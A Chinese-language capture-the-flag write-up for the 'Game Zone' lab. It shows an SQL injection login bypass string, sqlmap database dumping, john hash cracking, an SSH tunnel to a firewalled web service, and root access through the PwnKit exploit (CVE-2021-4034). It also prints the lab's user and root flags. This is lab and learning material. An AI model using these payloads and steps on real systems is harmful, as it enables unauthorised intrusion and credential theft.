# Game Zone

本房间将介绍SQLi（手动或通过SQLMap利用此漏洞），破解用户散列密码，使用SSH隧道揭示隐藏的服务以及使用metasploit有效负载获得root权限。

---

循例 nmap扫，只开22和80

看web，一个怀念版的游戏登录界面

随手试了一下：

    admin' or '1'='1'#

进去了

一个搜索页面，按照题目的要求，这里使用sqlmap

开启burp，正常发起搜索，然后在burp将该请求的信息导出到文件

使用sqlmap

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">sqlmap</font> <font color="#9755B3">-r</font> <u style="text-decoration-style:single">./req.txt</u> <font color="#9755B3">--dbms=mysql</font> <font color="#9755B3">-dump</font>
</pre>

john爆破hash密码

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./hash</u> <font color="#9755B3">--format=raw-sha256</font></pre>

登录ssh成功

<pre><font color="#47D4B9"><b>agent47@gamezone</b></font>:<font color="#277FFF"><b>~</b></font>$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
</pre>

---

知识点:

<img src="https://i.imgur.com/cYZsC8p.png" />

    反向 SSH 端口转发指定将远程服务器主机上的给定端口转发到本地端的给定主机和端口。

    -L 是一个本地隧道（你< - 客户端）。如果站点被阻止，您可以将流量转发到您拥有的服务器并查看它。例如，如果 imgur 在工作中被阻止，你可以执行 ssh -L 9000：imgur.com：80 user@example.com。 转到计算机上的localhost：9000，将使用其他服务器加载imgur流量。

    -R 是一个远程隧道（YOU --> CLIENT）。您将流量转发到其他服务器供其他人查看。与上面的例子类似，但相反。

.

    我们将使用一个名为 ss 的工具来调查主机上运行的套接字。

    如果我们运行 ss -tulpn，它会告诉我们正在运行哪些套接字连接

    论点	描述
    -t	显示 TCP 套接字
    -u	显示 UDP 套接字
    -l	仅显示侦听套接字
    -p	显示使用套接字的进程
    -n	不解析服务名称

ss -tulpn

发现有个tcp 10000端口开启

在目标上使用curl能够得知其服务是web，但是似乎被防火墙拦截了，该端口无法被外网访问。

我们使用该ssh用户进行流量转发

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh</font> <font color="#9755B3">-L</font> 8888:127.0.0.1:10000 agent47@10.10.200.149</pre>

将我们本地的8888端口流量通过ssh转发到目标的10000端口

访问我们本地的8888端口，看见是一个登录页面

我们已知的就是agent47的ssh登录凭据，尝试登录，成功

---

题目要求我们寻找cms的cve，但我偏不

我使用了pwnkit(CVE-2021-4034) 对pkexec的利用

<pre><font color="#47D4B9"><b>agent47@gamezone</b></font>:<font color="#277FFF"><b>~</b></font>$ ./PwnKit 
root@gamezone:/home/agent47# whoami
root
root@gamezone:/home/agent47# cat /root/root.txt
a4b945830144bdd71908d12d902adeee
</pre>

看到ubuntu版本为16.04，我猜可能还存在cve-2021-3493 overlayfs利用
